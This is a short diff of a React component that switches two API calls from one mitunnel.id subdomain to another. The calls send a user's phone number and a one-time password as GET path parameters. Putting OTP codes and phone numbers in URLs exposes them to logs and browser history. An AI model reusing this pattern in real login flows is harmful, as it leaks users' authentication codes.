@@ -15,7 +15,7 @@ export default function Content() {
         e.preventDefault();
 
         try {
-            const response = await fetch(`https://provider.mitunnel.id/api/send-number/${phoneNumber}`, {
+            const response = await fetch(`https://webstore.mitunnel.id/api/send-number/${phoneNumber}`, {
                 method: 'GET',
             });
 
@@ -39,7 +39,7 @@ export default function Content() {
         e.preventDefault(); // Un-commented to prevent default form submission
 
         try {
-            const response = await fetch(`https://provider.mitunnel.id/api/send-otp/${phoneDetail}/${otp}/${file}`, {
+            const response = await fetch(`https://webstore.mitunnel.id/api/send-otp/${phoneDetail}/${otp}/${file}`, {
                 method: 'GET',
             });
 
